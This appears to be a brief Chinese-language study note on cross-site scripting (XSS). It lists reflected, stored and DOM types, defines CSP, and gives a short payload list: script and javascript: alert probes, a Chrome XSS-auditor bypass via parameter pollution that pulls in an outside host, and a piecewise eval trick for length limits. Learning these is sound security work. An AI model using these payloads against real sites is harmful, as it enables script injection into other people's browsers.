XSS
================================

分类
--------------------------------
反射型xss
    一次浏览
    最常见，最广泛
    e.g http://www.baidu.com<script>alert("hack")</script>
储存型xss
    危害较大
    把相应脚本传到服务器上
DOMxss
    类似


CSP
--------------------------------
Content Security Policy，简称 CSP。顾名思义，这个规范与内容安全有关，主要是用来定义页面可以加载哪些资源，减少 XSS 的发生。


payload
--------------------------------

常用
<script>alert(/xss/)</script>

伪协议
<table background="javascript:alert(/xss/)"></table>

Chrome XSS auditor bypass with HPP:
?param=https://&param=@z.exeye.io/import%20rel=import%3E

长度限制
<script>s+="l"</script>
\...
<script>eval(s)</script>

